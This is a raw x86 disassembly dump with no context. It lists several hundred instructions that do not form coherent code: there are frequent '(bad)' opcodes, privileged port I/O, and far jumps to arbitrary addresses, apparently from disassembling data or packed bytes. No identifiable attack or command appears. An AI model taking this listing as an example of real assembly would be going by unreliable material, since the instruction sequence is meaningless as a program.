  421d83:	sub    al,BYTE PTR [edx-0x13323b32]
  421d89:	mov    eax,ds:0x34cff5e7
  421d8e:	mov    bl,0xc4
  421d90:	popf   
  421d91:	and    BYTE PTR [ecx],al
  421d93:	lock aam 0x68
  421d96:	cmp    bh,BYTE PTR [ebp+0x49]
  421d99:	arpl   WORD PTR [edi+ecx*1],si
  421d9c:	or     cl,BYTE PTR [esi+0x4e9246ee]
  421da2:	pop    es
  421da3:	ds das 
  421da5:	adc    bl,dl
  421da7:	mov    ds:0x13a9916,eax
  421dac:	fsubr  DWORD PTR [esi+0x6ef8ebff]
  421db2:	sbb    edx,eax
  421db4:	jge    0x421e14
  421db6:	pop    eax
  421db7:	rol    BYTE PTR [ebx+0x3a6acbe],cl
  421dbd:	dec    esi
  421dbe:	fisttp QWORD PTR [edx-0x4f]
  421dc1:	mov    di,0x1ceb
  421dc5:	dec    ebx
  421dc6:	xor    al,ah
  421dc8:	rcr    BYTE PTR [ebx+0x12],0xf4
  421dcc:	push   ds
  421dcd:	sub    dl,bh
  421dcf:	ins    BYTE PTR es:[edi],dx
  421dd0:	iret   
  421dd1:	jns    0x421ddd
  421dd3:	xlat   BYTE PTR ds:[ebx]
  421dd4:	mov    ah,0xb9
  421dd6:	stos   DWORD PTR es:[edi],eax
  421dd7:	and    BYTE PTR [edx+0x56],dh
  421dda:	mov    ah,0x96
  421ddc:	lock cs scas al,BYTE PTR es:[edi]
  421ddf:	sub    eax,0x5d788165
  421de4:	and    bl,0x1b
  421de7:	xlat   BYTE PTR ds:[ebx]
  421de8:	jecxz  0x421d8c
  421dea:	pop    edx
  421deb:	cmp    eax,0x581c3e3d
  421df0:	imul   edx,DWORD PTR [esi+0x26fae16f],0xa7570f1f
  421dfa:	cmp    eax,0x266cc660
  421dff:	int    0x5
  421e01:	ins    BYTE PTR es:[edi],dx
  421e02:	dec    esi
  421e03:	enter  0xe409,0x1b
  421e07:	stos   DWORD PTR es:[edi],eax
  421e08:	popf   
  421e09:	icebp  
  421e0a:	xchg   esp,eax
  421e0b:	ficom  DWORD PTR [ebx]
  421e0d:	ins    BYTE PTR es:[edi],dx
  421e0e:	mov    ecx,0xb57b925c
  421e13:	aad    0xad
  421e15:	mov    eax,0x4d806e72
  421e1a:	sbb    ch,al
  421e1c:	inc    ecx
  421e1d:	adc    ecx,DWORD PTR [eax-0x3d]
  421e20:	ins    BYTE PTR es:[edi],dx
  421e21:	in     al,0x27
  421e23:	inc    esi
  421e24:	sub    edi,0x43956c9c
  421e2a:	cmc    
  421e2b:	imul   ebp,DWORD PTR [ebx],0xffffff8b
  421e2e:	and    ch,dh
  421e30:	pop    ss
  421e31:	bound  ebp,QWORD PTR [edx]
  421e33:	and    DWORD PTR [edi-0x77dc8847],0x411c8416
  421e3d:	or     BYTE PTR [esi+edx*4-0x476cdc4a],0xb6
  421e45:	std    
  421e46:	push   es
  421e47:	outs   dx,BYTE PTR ds:[esi]
  421e48:	dec    eax
  421e49:	cmp    DWORD PTR [ecx+0x351ca09d],esp
  421e4f:	sub    al,0x7f
  421e51:	dec    esi
  421e52:	popa   
  421e53:	mov    esi,DWORD PTR [ebp-0x4a]
  421e56:	retf   
  421e57:	test   eax,0x72041365
  421e5c:	call   0xac02a070
  421e61:	mov    edx,es
  421e63:	loopne 0x421e98
  421e65:	test   eax,0x5be97387
  421e6a:	pop    ss
  421e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e6c:	inc    eax
  421e6d:	push   ebp
  421e6e:	add    eax,0x34928ee9
  421e73:	jno    0x421edf
  421e75:	ins    BYTE PTR es:[edi],dx
  421e76:	out    0xc2,al
  421e78:	retf   0x57af
  421e7b:	push   0xc9585976
  421e80:	fwait
  421e81:	aas    
  421e82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e83:	ficomp WORD PTR [edi+0x7b]
  421e86:	pushf  
  421e87:	aad    0xc6
  421e89:	fidiv  DWORD PTR [eax+0x2504f772]
  421e8f:	and    esi,DWORD PTR [esi+0x1d]
  421e92:	out    dx,al
  421e93:	test   edi,0xc950cbab
  421e99:	push   ss
  421e9a:	dec    ecx
  421e9b:	addr16 ret 
  421e9d:	or     al,0xb3
  421e9f:	out    0x73,al
  421ea1:	ss jne 0x421f12
  421ea4:	pop    ss
  421ea5:	sub    BYTE PTR [ebp-0x2b4e654],dh
  421eab:	mov    dl,0x17
  421ead:	mov    ebp,0xc8a73161
  421eb2:	mov    ds:0x8a19b055,al
  421eb7:	sub    DWORD PTR [ecx],ecx
  421eb9:	hlt    
  421eba:	fs add al,0xb6
  421ebd:	outs   dx,DWORD PTR ds:[esi]
  421ebe:	mov    al,0x9f
  421ec0:	int    0x12
  421ec2:	(bad)  ds:0x31224e4e
  421ec8:	add    DWORD PTR [edi],0x22
  421ecb:	dec    ebp
  421ecc:	pop    esp
  421ecd:	inc    ebx
  421ece:	mov    dh,0x5
  421ed0:	inc    edi
  421ed1:	sub    BYTE PTR [eax],cl
  421ed3:	inc    esi
  421ed4:	push   DWORD PTR [edx+0x5a4e0de7]
  421eda:	les    esi,FWORD PTR [eax]
  421edc:	(bad)  
  421edd:	push   ss
  421ede:	cmp    ebp,DWORD PTR [edi-0x60]
  421ee1:	mov    edi,0x2a589d46
  421ee6:	shl    DWORD PTR [eax+esi*1],cl
  421ee9:	(bad)  
  421eea:	dec    eax
  421eeb:	call   0xa92e3ae7
  421ef0:	xchg   BYTE PTR [ebx-0x341d9432],dh
  421ef6:	cmc    
  421ef7:	dec    ebp
  421ef8:	retf   0x7875
  421efb:	lods   eax,DWORD PTR ds:[esi]
  421efc:	cdq    
  421efd:	sub    edx,edx
  421eff:	or     BYTE PTR [ebp+0x69f0003a],0xd8
  421f06:	push   esi
  421f07:	cmp    eax,0xa10cbf30
  421f0c:	xor    ch,bl
  421f0e:	jge    0x421ed6
  421f10:	loopne 0x421eec
  421f12:	into   
  421f13:	sbb    eax,0xf93d630
  421f18:	pop    esi
  421f19:	nop
  421f1a:	inc    ebx
  421f1b:	fnstcw WORD PTR [eax+0x1b7a4c0d]
  421f21:	jnp    0x421f3f
  421f23:	fnclex 
  421f25:	and    DWORD PTR [ecx-0x79],eax
  421f28:	pusha  
  421f29:	enter  0xff5c,0xc
  421f2d:	push   eax
  421f2e:	(bad)  
  421f2f:	imul   edi,DWORD PTR [ebp+0x537cc2e0],0x5637ed5e
  421f39:	jo     0x421ed1
  421f3b:	pop    es
  421f3c:	jmp    0xd8c1c8e7
  421f41:	bswap  ecx
  421f43:	dec    eax
  421f44:	push   ebx
  421f45:	xor    eax,DWORD PTR [esi]
  421f47:	fisubr WORD PTR [edi+0x23]
  421f4a:	lods   al,BYTE PTR ds:[esi]
  421f4b:	int3   
  421f4c:	push   ss
  421f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f4e:	nop
  421f4f:	outs   dx,BYTE PTR ds:[esi]
  421f50:	imul   edx,DWORD PTR [edx],0x3950c6f9
  421f56:	push   cs
  421f57:	sub    BYTE PTR ds:0xa9992842,cl
  421f5d:	fbld   TBYTE PTR [esi-0x5c]
  421f60:	or     bh,BYTE PTR [edx+0x9]
  421f63:	out    0xb5,eax
  421f65:	pop    esp
  421f66:	mov    edi,0x1302823f
  421f6b:	sub    esp,DWORD PTR [esi]
  421f6d:	es pop esi
	...
  421f77:	add    BYTE PTR [eax],al
  421f79:	add    dh,ch
  421f7b:	ret    0x2d9d
  421f7e:	mov    ebp,0x33c3fe7f
  421f83:	ja     0x421f4e
  421f85:	or     BYTE PTR [edx-0x1bd4e342],dh
  421f8b:	call   0x0:0x1fd0001
  421f92:	idiv   BYTE PTR [ebp-0x49c43b58]
  421f98:	adc    BYTE PTR [edx],0x8b
  421f9b:	mov    bl,al
  421f9d:	test   DWORD PTR [edi-0x18f39ef0],edi
  421fa3:	out    0x92,eax
  421fa5:	push   esi
  421fa6:	fnstcw WORD PTR [ecx-0x28]
  421fa9:	and    esi,DWORD PTR [edi-0x33]
  421fac:	in     al,dx
  421fad:	adc    al,cl
  421faf:	pop    edi
  421fb0:	sub    al,0x27
  421fb2:	pop    es
  421fb3:	test   BYTE PTR [ebp+0x31],al
  421fb6:	shl    BYTE PTR [ebx-0x59],cl
  421fb9:	sti    
  421fba:	sub    BYTE PTR [eax],bh
  421fbc:	sbb    BYTE PTR [ecx],bl
  421fbe:	mov    ebx,0xbf28bdef
  421fc3:	xor    BYTE PTR [edi],bh
  421fc5:	mov    cl,0xef
  421fc7:	adc    BYTE PTR [edx+0x55318cf3],dl
  421fcd:	jge    0x421ff7
  421fcf:	mov    ds,WORD PTR [esi]
  421fd1:	adc    DWORD PTR [eax+0x5892034f],esp
  421fd7:	mov    ebx,0x1f06d67f
  421fdc:	fcom   DWORD PTR [edx+0x9]
  421fdf:	xchg   bh,bh
  421fe1:	sub    al,0xed
  421fe3:	mov    esp,0x43e697e0
  421fe8:	aaa    
  421fe9:	daa    
  421fea:	and    BYTE PTR [ebp+0x37d1748d],0xa8
  421ff1:	mov    al,ds:0xcd8f09ff
  421ff6:	push   edx
  421ff7:	push   ds
  421ff8:	retf   0x3b21
  421ffb:	and    eax,0x8f3eebb3
  422000:	lahf   
  422001:	(bad)  
  422002:	jp     0x421fe0
  422004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422005:	mov    bh,0x22
  422007:	add    eax,0x27fa16e0
  42200c:	mov    eax,0x9d3939bb
  422011:	ja     0x422056
  422013:	push   eax
  422014:	adc    bh,dh
  422016:	adc    al,0x33
  422018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422019:	scas   eax,DWORD PTR es:[edi]
  42201a:	das    
  42201b:	ret    0x38a2
  42201e:	push   esi
  42201f:	sbb    bl,BYTE PTR [ebp+edx*8-0x291d0aa5]
  422026:	aaa    
  422027:	rcr    DWORD PTR [esi-0x43],1
  42202a:	adc    eax,0x9d60dc21
  42202f:	scas   al,BYTE PTR es:[edi]
  422030:	std    
  422031:	imul   eax,DWORD PTR [esi+ecx*4],0xd029b16c
  422038:	fild   DWORD PTR [ebp-0x5d7418b4]
  42203e:	icebp  
  42203f:	dec    esi
  422040:	pop    ecx
  422041:	out    dx,eax
  422042:	xchg   ebx,eax
  422043:	rcr    edx,0xa2
  422046:	or     BYTE PTR [ecx-0x2a8ce7a3],dh
  42204c:	rcr    DWORD PTR [esi+0x1a],0x4a
  422050:	inc    ebx
  422051:	xchg   ah,dh
  422053:	pop    ds
  422054:	hlt    
  422055:	nop
  422056:	fild   QWORD PTR [ecx-0x19720d3a]
  42205c:	pop    edi
  42205d:	sub    ecx,esi
  42205f:	or     eax,0xb5f89a85
  422064:	pop    ds
  422065:	fwait
  422066:	out    dx,al
  422067:	les    esi,FWORD PTR [edi]
  422069:	xchg   esp,eax
  42206a:	daa    
  42206b:	loop   0x42200b
  42206d:	daa    
  42206e:	add    al,0x4e
  422070:	leave  
  422071:	xchg   edi,eax
  422072:	rol    BYTE PTR ds:0x9a06e1e8,0x29
  422079:	popa   
  42207a:	fwait
  42207b:	add    bh,ch
  42207d:	je     0x422040
  42207f:	inc    esp
  422080:	(bad)  
  422081:	js     0x422091
  422083:	inc    ecx
  422084:	push   esi
  422085:	fsubrp st(7),st
  422087:	xchg   ebp,eax
  422088:	stos   BYTE PTR es:[edi],al
  422089:	push   eax
  42208a:	mov    fs,WORD PTR [ebx]
  42208c:	mov    esp,0x2eb6430b
  422091:	jnp    0x422042
  422093:	sti    
  422094:	xor    ecx,edi
  422096:	stos   DWORD PTR es:[edi],eax
  422097:	shr    BYTE PTR [ecx+0x3db8bc9a],cl
  42209d:	sub    eax,0xdaa28094
  4220a2:	pop    ebx
  4220a3:	jnp    0x422037
  4220a5:	pusha  
  4220a6:	call   0x76b42c6e
  4220ab:	fld    DWORD PTR [edi+0x10]
  4220ae:	adc    al,0x52
  4220b0:	dec    esi
  4220b1:	pushf  
  4220b2:	ds aam 0x8a
  4220b5:	scas   al,BYTE PTR es:[edi]
  4220b6:	hlt    
  4220b7:	test   edx,0xfd056dfa
  4220bd:	out    dx,eax
  4220be:	and    bp,di
  4220c1:	mov    cl,0xbd
  4220c3:	mov    dl,0x13
  4220c5:	xor    bl,BYTE PTR [esp+esi*1]
  4220c8:	xor    DWORD PTR ds:0x46f02bc0,eax
  4220ce:	stos   BYTE PTR es:[edi],al
  4220cf:	ror    ebp,1
  4220d1:	jbe    0x422082
  4220d3:	int3   
  4220d4:	inc    esi
  4220d5:	jnp    0x42208b
  4220d7:	je     0x4220e4
  4220d9:	loop   0x422130
  4220db:	ds leave 
  4220dd:	and    edi,0xfdf9d82a
  4220e3:	xchg   esi,eax
  4220e4:	dec    ecx
  4220e5:	inc    ebp
  4220e6:	xchg   BYTE PTR [ecx-0x36b73d39],bl
  4220ec:	mov    esi,0xacb12599
  4220f1:	aaa    
  4220f2:	inc    DWORD PTR [edi+0x2f]
  4220f5:	mov    esp,0xcf3c13b7
  4220fa:	call   0x9f70:0x2979fa06
  422101:	adc    ebp,DWORD PTR [eax-0x75b0b4fb]
  422107:	int    0x74
  422109:	or     eax,0x215c3ff0
  42210e:	arpl   WORD PTR ss:[eax-0x6d8ac15d],ax
  422115:	cld    
  422116:	cli    
  422117:	cwde   
  422118:	push   edi
  422119:	cwde   
  42211a:	retf   0x44c1
  42211d:	shl    DWORD PTR [ebp-0x7c],1
  422120:	pop    esp
  422121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422122:	pop    ss
  422123:	mov    eax,0x1a988662
  422128:	sub    BYTE PTR ds:[ecx-0x35],0x85
  42212d:	pop    ebx
  42212e:	daa    
  42212f:	adc    edx,DWORD PTR [esi+0x34]
  422132:	mov    esp,0xce7ad38b
  422137:	push   ecx
  422138:	mov    dh,0xf9
  42213a:	mov    eax,edi
  42213c:	mov    dh,0x32
  42213e:	mov    ecx,0x669b2282
  422143:	hlt    
  422144:	(bad)  
  422146:	push   ebp
  422147:	jb     0x42210f
  422149:	in     eax,dx
  42214a:	sbb    edx,DWORD PTR [esi]
  42214c:	mov    BYTE PTR [ebx+0x4],cl
  42214f:	call   0x95d0:0xad15086
  422156:	test   BYTE PTR [esi+0xac7553b],0x56
  42215d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42215e:	cmp    dl,cl
  422160:	inc    edi
  422161:	mov    bh,0x63
  422163:	cmp    ecx,DWORD PTR [esi+0x258cb2a3]
  422169:	jmp    0x6ca8:0x966436ff
  422170:	and    eax,DWORD PTR [edi]
  422172:	inc    esi
  422173:	inc    ecx
  422174:	adc    BYTE PTR [ecx+eax*8-0x20],dh
  422178:	ds out 0xf3,al
  42217b:	xor    bh,BYTE PTR [edi+0x13]
  42217e:	push   eax
  42217f:	fwait
  422180:	je     0x422188
  422182:	mov    cl,0xc2
  422184:	(bad)  
  422185:	fstp   QWORD PTR [esi]
  422187:	in     eax,0xf7
  422189:	lods   al,BYTE PTR ds:[esi]
  42218a:	mov    ds:0x4b218d5e,eax
	...
  422197:	add    BYTE PTR [eax],al
  422199:	add    BYTE PTR [ebx-0x2a],dl
  42219c:	(bad)  
  42219d:	push   esi
  42219e:	(bad)  
  42219f:	jle    0x42219c
  4221a1:	xlat   BYTE PTR ds:[ebx]
  4221a2:	retf   
  4221a3:	push   ds
  4221a4:	test   DWORD PTR [ebp+0x53],0xe1a6a5a3
  4221ab:	pushf  
  4221ac:	add    DWORD PTR [eax],eax
  4221ae:	std    
  4221af:	add    DWORD PTR [eax],eax
  4221b1:	add    BYTE PTR [esi+0x64b35068],al
  4221b7:	fnsave [edx*2+0x6f34a101]
  4221be:	pop    ss
  4221bf:	ror    ch,0xd3
  4221c2:	sbb    DWORD PTR [eax-0x69],edx
  4221c5:	clc    
  4221c6:	cdq    
  4221c7:	cmp    al,0x8e
  4221c9:	retf   0x7c0d
  4221cc:	pop    ecx
  4221cd:	xor    eax,0xc4df27fc
  4221d2:	int    0xd6
  4221d4:	or     edx,edi
  4221d6:	push   0x34
  4221d8:	iret   
  4221d9:	pop    ebp
  4221da:	xor    DWORD PTR [esp+ebx*2+0x5f],ebp
  4221de:	mov    esi,0x391a9089
  4221e3:	ret    
  4221e4:	xchg   ebp,eax
  4221e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221e6:	push   esp
  4221e7:	ds push ebp
  4221e9:	aad    0xc7
  4221eb:	mov    ah,0x4
  4221ed:	nop
  4221ee:	sbb    BYTE PTR [edx-0x5f8e0ed1],bl
  4221f4:	stos   BYTE PTR es:[edi],al
  4221f5:	pop    ebx
  4221f6:	adc    eax,0x3e876184
  4221fb:	jecxz  0x4221f4
  4221fd:	ins    DWORD PTR es:[edi],dx
  4221fe:	xchg   ebx,eax
  4221ff:	(bad)  [eax+0xe]
  422202:	pop    es
  422203:	into   
  422204:	xor    ch,BYTE PTR [ebx+0x44]
  422207:	outs   dx,DWORD PTR ds:[esi]
  422208:	stos   BYTE PTR es:[edi],al
  422209:	cmc    
  42220a:	cdq    
  42220b:	adc    al,0x70
  42220d:	aaa    
  42220e:	int3   
  42220f:	mov    dl,0x18
  422211:	mov    dl,0x1e
  422213:	stc    
  422214:	mov    ds:0x8d1b4662,al
  422219:	ret    0xda01
  42221c:	cmp    eax,DWORD PTR [edx-0x26]
  42221f:	jno    0x422242
  422221:	scas   eax,DWORD PTR es:[edi]
  422222:	add    al,0xd8
  422224:	mov    ah,0x82
  422226:	sbb    ebp,edx
  422228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422229:	aas    
  42222a:	xor    ah,BYTE PTR [ebp-0x507f5c39]
  422230:	or     esp,DWORD PTR [eax+0x14]
  422233:	(bad)  
  422234:	js     0x4221e5
  422236:	mov    ds:0xb3f90225,eax
  42223b:	test   BYTE PTR [ecx-0x6dc9a09a],dl
  422241:	out    0xff,al
  422243:	test   DWORD PTR [edi],edx
  422245:	xchg   ecx,eax
  422246:	mov    BYTE PTR [eax],ah
  422248:	mov    cl,0xa
  42224a:	xchg   BYTE PTR [esi],al
  42224c:	xchg   esp,eax
  42224d:	pop    esp
  42224e:	jg     0x42224d
  422250:	and    BYTE PTR [esp+ebx*8+0x31],dh
  422254:	dec    esp
  422255:	nop
  422256:	fisub  WORD PTR [edx-0x4f]
  422259:	fidiv  WORD PTR [esi]
  42225b:	xchg   esi,eax
  42225c:	mov    ah,0xd5
  42225e:	sub    eax,DWORD PTR ds:[esi-0x7999adb7]
  422265:	mov    ecx,0x12a3b218
  42226a:	prefetcht2 BYTE PTR [ecx]
  42226d:	mov    dh,al
  42226f:	sti    
  422270:	cli    
  422271:	jge    0x422217
  422273:	mov    al,ds:0x1f7ab151
  422278:	ins    BYTE PTR es:[edi],dx
  422279:	std    
  42227a:	push   cs
  42227b:	cs loopne 0x422269
  42227e:	in     eax,dx
  42227f:	mov    ds:0xd078f219,eax
  422284:	jge    0x42223a
  422286:	rcr    BYTE PTR [edi],cl
  422288:	lds    esi,FWORD PTR ds:0x6de97f14
  42228e:	jecxz  0x422232
  422290:	mov    WORD PTR [edx+0x131cd0e4],ds
  422296:	mov    esi,0x7fe0b9d
  42229b:	dec    esi
  42229c:	or     ecx,esp
  42229e:	es sub al,0xe2
  4222a1:	in     al,dx
  4222a2:	ja     0x422323
  4222a4:	imul   ecx,ebp,0xffffffe0
  4222a7:	scas   al,BYTE PTR es:[edi]
  4222a8:	mov    WORD PTR [ebx],?
  4222aa:	dec    ebp
  4222ab:	aad    0xa0
  4222ad:	add    eax,0x31244c30
  4222b2:	inc    ebp
  4222b3:	test   eax,0x1d28d29b
  4222b8:	ficom  WORD PTR [esi]
  4222ba:	shl    DWORD PTR [ebx],1
  4222bc:	leave  
  4222bd:	and    BYTE PTR [edx+0x17],dh
  4222c0:	sbb    ch,dh
  4222c2:	imul   ebp,DWORD PTR [esi+0x57],0x53
  4222c6:	pop    edx
  4222c7:	arpl   si,dx
  4222c9:	shr    BYTE PTR [edi],1
  4222cb:	and    edx,DWORD PTR [eax-0x76]
  4222ce:	lods   al,BYTE PTR ds:[esi]
  4222cf:	inc    eax
  4222d0:	xchg   esi,eax
  4222d1:	cmp    DWORD PTR [edx+0x7],eax
  4222d4:	jl     0x42231e
  4222d6:	jge    0x422269
  4222d8:	stos   DWORD PTR es:[edi],eax
  4222d9:	inc    esp
  4222da:	(bad)  
  4222db:	mov    eax,0xe1395a2f
  4222e0:	push   0xffffff8e
  4222e2:	or     al,0x51
  4222e4:	mov    eax,ds:0xac12fa7e
  4222e9:	cmp    ebx,ebp
  4222eb:	shr    al,cl
  4222ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222ee:	ins    DWORD PTR es:[edi],dx
  4222ef:	ins    DWORD PTR es:[edi],dx
  4222f0:	dec    ebx
  4222f1:	lods   al,BYTE PTR ds:[esi]
  4222f2:	jp     0x4222c3
  4222f4:	int    0xf2
  4222f6:	mov    dh,0xea
  4222f8:	jne    0x422359
  4222fa:	cli    
  4222fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222fc:	popa   
  4222fd:	aas    
  4222fe:	rol    esp,0x85
  422301:	(bad)  
  422303:	stc    
  422304:	call   0x72e8:0xc0ac5572
  42230b:	push   esi
  42230c:	push   0x7abd10d8
  422311:	adc    DWORD PTR [eax+0x3128d380],esp
  422317:	cmc    
  422318:	fld    QWORD PTR [esi-0x66]
  42231b:	fs add al,0x8a
  42231e:	push   0xffffff89
  422320:	cmc    
  422321:	es stos DWORD PTR es:[edi],eax
  422323:	aaa    
  422324:	sub    DWORD PTR [esi],ebx
  422326:	pop    eax
  422327:	mov    dl,0x21
  422329:	in     al,dx
  42232a:	outs   dx,BYTE PTR ds:[esi]
  42232b:	fs scas eax,DWORD PTR es:[edi]
  42232d:	test   BYTE PTR ds:0x207ce1ee,al
  422333:	leave  
  422334:	stc    
  422335:	jns    0x422309
  422337:	scas   eax,DWORD PTR es:[edi]
  422338:	dec    esp
  422339:	hlt    
  42233a:	adc    ch,BYTE PTR [eax-0x1ad29e67]
  422340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422341:	sahf   
  422342:	ret    
  422343:	and    bh,BYTE PTR [edx+0x304d2a34]
  422349:	inc    edi
  42234a:	inc    esi
  42234b:	push   ebp
  42234c:	test   WORD PTR [eax],ax
  42234f:	mov    dl,0x74
  422351:	int    0xb8
  422353:	fadd   st(2),st
  422355:	mov    ebx,0x3f83d113
  42235a:	mov    edx,eax
  42235c:	daa    
  42235d:	cmp    ebx,DWORD PTR [ebx]
  42235f:	dec    ecx
  422360:	div    DWORD PTR [edi]
  422362:	addr16 pop ss
  422364:	pop    es
  422365:	cmp    esi,DWORD PTR [ecx+0x6f1a971a]
  42236b:	inc    ecx
  42236c:	addr16 jmp 0x8a26:0x2b5993ff
  422374:	cmp    DWORD PTR [ecx-0x36],edi
  422377:	das    
  422378:	dec    ecx
  422379:	xor    DWORD PTR [ecx],esi
  42237b:	fwait
  42237c:	sbb    ebp,DWORD PTR [edx+0x1a]
  42237f:	sbb    DWORD PTR [esi],esi
  422381:	aam    0x77
  422383:	stos   BYTE PTR es:[edi],al
  422384:	sahf   
  422385:	push   ebp
  422386:	xor    al,0x6d
  422388:	xor    DWORD PTR [edi-0x57],ebp
  42238b:	jle    0x4223cf
  42238d:	mov    bh,0x10
  42238f:	xor    ah,BYTE PTR [edi]
  422391:	pop    edx
  422392:	les    eax,FWORD PTR [edx+0x47c6bf01]
  422398:	jge    0x42239e
  42239a:	add    bl,BYTE PTR [ebp+0x22a2ed8b]
  4223a0:	mov    ecx,0xe1c6a507
  4223a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223a6:	dec    esi
  4223a7:	ss popf 
  4223a9:	or     ch,BYTE PTR [ebp-0x32fac646]
	...
  4223b7:	add    BYTE PTR [eax],al
  4223b9:	add    BYTE PTR [ecx],dl
  4223bb:	push   cs
  4223bc:	or     dl,ch
  4223be:	pop    ds
  4223bf:	out    dx,al
  4223c0:	repz jmp FWORD PTR [ecx-0x6c]
  4223c4:	fucomp st(0)
  4223c6:	jb     0x4223f1
  4223c8:	and    ch,ch
  4223ca:	ficomp WORD PTR [esi+0x1fd0001]
  4223d0:	add    BYTE PTR [eax],al
  4223d2:	not    DWORD PTR [edi+0x48]
  4223d5:	outs   dx,BYTE PTR ds:[esi]
  4223d6:	js     0x422411
  4223d8:	sub    ebp,DWORD PTR [ecx+esi*4]
  4223db:	push   ebx
  4223dc:	enter  0x7b05,0x66
  4223e0:	mov    al,ds:0xb94725f7
  4223e5:	jmp    0xd40c0c98
  4223ea:	rol    ecx,cl
  4223ec:	adc    edx,DWORD PTR [edx+ebx*2]
  4223ef:	aaa    
  4223f0:	and    esi,ecx
  4223f2:	(bad)  [edx]
  4223f4:	xlat   BYTE PTR ds:[ebx]
  4223f5:	rol    BYTE PTR [edi+0x5d],0xc9
  4223f9:	out    dx,eax
  4223fa:	call   FWORD PTR [ecx+0x2c6c43e1]
  422400:	out    0xd9,al
  422402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422403:	rol    BYTE PTR [ecx+eax*2],1
  422406:	data16 mov ah,0x7
  422409:	add    DWORD PTR [esi-0x4c],ecx
  42240c:	mov    bh,0x54
  42240e:	and    BYTE PTR [ebx+edx*4],0x8b
  422412:	mov    edx,0x6e7c8742
  422417:	in     al,0x98
  422419:	lods   al,BYTE PTR ds:[esi]
  42241a:	and    eax,DWORD PTR [ebp-0x23]
  42241d:	iret   
  42241e:	adc    al,0x30
  422420:	hlt    
  422421:	int    0xbc
  422423:	cli    
  422424:	repnz add eax,0xc8d77b59
  42242a:	or     cl,0x90
  42242d:	sbb    DWORD PTR [ebx-0x17],esi
  422430:	ret    0x6da5
  422433:	int3   
  422434:	(bad)  
  422436:	cmp    DWORD PTR [esi+0x46a9ab3f],esi
  42243c:	sub    DWORD PTR [ebx],0x47
  42243f:	mov    bh,0xed
  422441:	nop
  422442:	dec    esp
  422443:	adc    eax,0xe72ceec6
  422448:	mov    WORD PTR [edi-0x7f],fs
  42244b:	out    dx,eax
  42244c:	data16 add bl,ah
  42244f:	sti    
  422450:	or     eax,0xdab0e264
  422455:	jae    0x4224af
  422457:	fist   WORD PTR [ebx-0x78]
  42245a:	fnstenv [edx]
  42245c:	mov    esp,0x6d720df
  422461:	mov    edx,0xc636184
  422466:	mov    al,0x1
  422468:	adc    eax,0xf8af4c1b
  42246d:	gs icebp 
  42246f:	shr    DWORD PTR [ebx-0x70],cl
  422472:	pop    ds
  422473:	mov    bh,0xa3
  422475:	call   0xb6db:0x9530c70c
  42247c:	mov    ds:0xd1091a9f,al
  422481:	push   es
  422482:	(bad)  
  422483:	mov    esi,0x50ee479
  422488:	bound  edi,QWORD PTR [esp+eiz*4]
  42248b:	lods   eax,DWORD PTR ds:[esi]
  42248c:	loope  0x42250b
  42248e:	jmp    FWORD PTR [ebx+ebp*1+0x7d1bcb32]
  422495:	inc    esp
  422496:	cld    
  422497:	push   DWORD PTR [edi]
  422499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42249a:	pop    ecx
  42249b:	or     eax,0x58d1536c
  4224a0:	sbb    BYTE PTR [ebp-0x49a13712],ah
  4224a6:	cmp    al,0xca
  4224a8:	xor    eax,0x266ba406
  4224ad:	rcl    BYTE PTR [ebx],cl
  4224af:	clc    
  4224b0:	cwde   
  4224b1:	or     ecx,esp
  4224b3:	mov    ah,0xa4
  4224b5:	mov    bl,0xcd
  4224b7:	jecxz  0x422525
  4224b9:	xor    cl,BYTE PTR [ecx]
  4224bb:	leave  
  4224bc:	inc    esp
  4224bd:	aas    
  4224be:	add    ebx,DWORD PTR [esi-0x608ed8e7]
  4224c4:	xlat   BYTE PTR ds:[ebx]
  4224c5:	jb     0x4224be
  4224c7:	pop    ebp
  4224c8:	jle    0x422504
  4224ca:	int    0x1a
  4224cc:	push   eax
  4224cd:	cmp    esi,DWORD PTR [ebx-0x24e9b20a]
  4224d3:	pop    ebp
  4224d4:	inc    edx
  4224d5:	sahf   
  4224d6:	dec    ebx
  4224d7:	std    
  4224d8:	mov    WORD PTR [eax-0x38029959],fs
  4224de:	aam    0x52
  4224e0:	stos   DWORD PTR es:[edi],eax
  4224e1:	adc    eax,0xa8ca303a
  4224e6:	and    DWORD PTR [edi],0x50
  4224e9:	dec    edx
  4224ea:	add    DWORD PTR [ecx+ebx*1+0x4d],ebp
  4224ee:	inc    ebx
  4224ef:	repz enter 0xe100,0x8a
  4224f4:	cmp    ch,0xab
  4224f7:	or     eax,0x71609df
  4224fc:	jmp    0x3e9c:0x5de974c8
  422503:	pop    ecx
  422504:	out    dx,eax
  422505:	stos   BYTE PTR es:[edi],al
  422506:	mov    ds:0x791b558e,eax
  42250b:	into   
  42250c:	and    bl,BYTE PTR ds:0xa46aaf25
  422512:	stc    
  422513:	mov    esi,0x58a4f2ea
  422518:	pop    ds
  422519:	xor    BYTE PTR [esi],dl
  42251b:	cdq    
  42251c:	ret    0xc855
  42251f:	call   0xa795b243
  422524:	pusha  
  422525:	cwde   
  422526:	into   
  422527:	sti    
  422528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422529:	dec    ebx
  42252a:	test   ah,dl
  42252c:	inc    ebx
  42252d:	retf   0xc74
  422530:	mov    DWORD PTR [ebx+0x31d632ca],0x2f94265b
  42253a:	and    BYTE PTR [ebx-0x59],0x6d
  42253e:	mov    al,BYTE PTR [eax+0x6577b21f]
  422544:	loop   0x4224e4
  422546:	std    
  422547:	dec    ebx
  422548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422549:	retf   
  42254a:	not    DWORD PTR [ecx+0x26]
